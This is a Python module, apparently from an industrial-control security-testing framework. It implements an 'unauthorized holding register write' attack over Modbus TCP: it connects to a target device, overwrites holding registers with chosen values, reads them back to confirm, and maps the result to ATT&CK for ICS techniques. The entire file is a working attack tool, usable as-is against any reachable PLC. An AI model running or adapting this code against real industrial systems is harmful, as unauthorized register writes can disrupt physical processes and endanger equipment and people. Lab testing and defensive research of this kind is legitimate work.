from pymodbus.client import ModbusTcpClient
import time
import logging
from .attack_result import AttackResult
from .validation import ModbusValidator
from .attack_mapping import get_attack_techniques

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

class ModbusUnauthorizedHoldingRegisterWriter:
    def __init__(self, host='localhost', port=502, unit_id=1):
        self.host = host
        self.port = port
        self.unit_id = unit_id
        self.client = None

    def connect(self):
        """Establish connection to Modbus server"""
        try:
            self.client = ModbusTcpClient(self.host, port=self.port)
            if self.client.connect():
                logger.info(f"Connected to target Modbus server at {self.host}:{self.port}")
                return True
            return False
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False

    def write_holding_registers(self, start_addr=0, values=None, log_output=True):
        """Write holding registers: First 2 = 0x0000, Last 2 = 0xFFFF (default)"""
        if values is None:
            values = [0x0000] * 2 + [0xFFFF] * 2
        try:
            result = self.client.write_registers(start_addr, values, device_id=self.unit_id)
            if not result.isError():
                if log_output:
                    logger.info("Successfully wrote holding register values.")
                return True
            else:
                if log_output:
                    logger.error("Failed to write holding register values.")
                return False
        except Exception as e:
            if log_output:
                logger.error(f"Error writing holding registers: {e}")
            return False

    def read_holding_registers(self, start_addr=0, count=4, log_output=True):
        """Read holding registers (analog outputs)"""
        try:
            result = self.client.read_holding_registers(address=start_addr, count=count, device_id=self.unit_id)
            if not result.isError():
                if log_output:
                    logger.info("Holding Register Values:")
                    for i, value in enumerate(result.registers):
                        logger.info("  Register {}: {} (0x{:04X})".format(start_addr + i, value, value))
                return result.registers
            return None
        except Exception as e:
            if log_output:
                logger.error(f"Failed to read holding registers: {e}")
            return None

    def execute(self, start=0, count=4, values=None):
        """
        Execute holding register write attack and return structured result.

        Args:
            start: Starting address for register write (default: 0)
            count: Number of registers to write (default: 4)
            values: List of integer values to write (default: [0x0000]*2 + [0xFFFF]*2)

        Returns:
            AttackResult with write result and readback data
        """
        if values is None:
            values = [0x0000] * 2 + [0xFFFF] * 2

        # Validate parameters
        valid, msg = ModbusValidator.validate_write_operation(start, count, self.unit_id, 'write_registers')
        if not valid:
            return AttackResult(
                attack='register',
                target={'host': self.host, 'port': self.port, 'unit_id': self.unit_id},
                params={'start': start, 'count': count},
                success=False,
                timestamp=AttackResult.create('register', self.host, self.port, self.unit_id).timestamp,
                error=f"Validation failed: {msg}"
            )

        # Validate each value
        for i, val in enumerate(values):
            valid, msg = ModbusValidator.validate_register_value(val)
            if not valid:
                return AttackResult(
                    attack='register',
                    target={'host': self.host, 'port': self.port, 'unit_id': self.unit_id},
                    params={'start': start, 'count': count},
                    success=False,
                    timestamp=AttackResult.create('register', self.host, self.port, self.unit_id).timestamp,
                    error=f"Validation failed for value at index {i}: {msg}"
                )

        result = AttackResult.create(
            'register', self.host, self.port, self.unit_id,
            params={'start': start, 'count': count, 'values': values}
        )

        try:
            if not self.connect():
                result.error = "Failed to connect to Modbus server"
                return result

            # Write registers
            write_success = self.write_holding_registers(start, values, log_output=False)
            result.data['write_success'] = write_success

            time.sleep(0.5)  # Small delay before reading

            # Read back to verify
            registers = self.read_holding_registers(start, count, log_output=False)
            if registers is not None:
                result.data['registers'] = {start + i: val for i, val in enumerate(registers)}

            self.client.close()
            result.success = write_success

        except Exception as e:
            result.error = str(e)
            if self.client:
                self.client.close()

        # Populate ATT&CK for ICS technique mapping
        techniques = get_attack_techniques('register')
        if techniques:
            result.attack_technique = techniques[0] if len(techniques) == 1 else {'techniques': techniques}

        return result

    def run_test(self):
        """Write values to holding registers, then read them back (backward compatibility)"""
        if self.connect():
            logger.info("\nWriting values to Modbus server...")
            self.write_holding_registers()

            time.sleep(0.5)  # Small delay before reading

            logger.info("\nReading values back...")
            self.read_holding_registers()

            self.client.close()
        else:
            logger.error("Failed to connect to Modbus server")

if __name__ == "__main__":
    writer = ModbusUnauthorizedHoldingRegisterWriter()
    writer.run_test()
